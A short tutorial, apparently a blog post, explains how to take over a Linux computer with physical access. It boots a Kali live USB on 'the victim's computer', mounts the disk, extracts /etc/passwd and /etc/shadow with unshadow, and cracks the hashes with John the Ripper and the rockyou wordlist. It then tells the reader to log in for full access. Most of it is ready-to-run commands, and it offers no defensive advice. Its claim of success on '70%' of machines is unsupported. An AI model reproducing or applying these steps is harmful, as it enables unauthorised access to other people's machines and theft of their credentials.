# Your computer is not safe
description: How to hack the password of 70% linux machines

## Overview
- boot into the system using live usb
- create a hash of etc password and etc shadow
- crack it using tools like john the ripper

## Steps
1. Create a live USB of Kali Linux
2. Boot into this usb from the victim's computer
3. mount the root partition under /mnt

```bash
lsblk
mount /dev/sda2 /mnt 
```
4. Navigate to etc and create hash out of shadow and password file using the unshadow util. Save this in the home directory 
In linux, the passwords of all users are stored as a hash in a /etc/shadow file. The corresponding names can be taken from /etc/password file
```bash
sudo unshadow /etc/passwd /etc/shadow > ~/shadowhash
```
5. Crack this using tools like johntheripper. Pass in a wordlist if the password is complex
```bash
john --format=crypt shadowhash
# or
john shadowhash --wordlist=/usr/share/wordlists/rockyou.txt
```

This should give you the password in plain text format for the victim's OS in 70% + cases.

Reboot with the victim's OS and Login with this password to gain full access to the victim's OS.


Note: This article focuses only on Linux machines. However, keep in mind that similar thing can be used for Windows systems as well.

The End
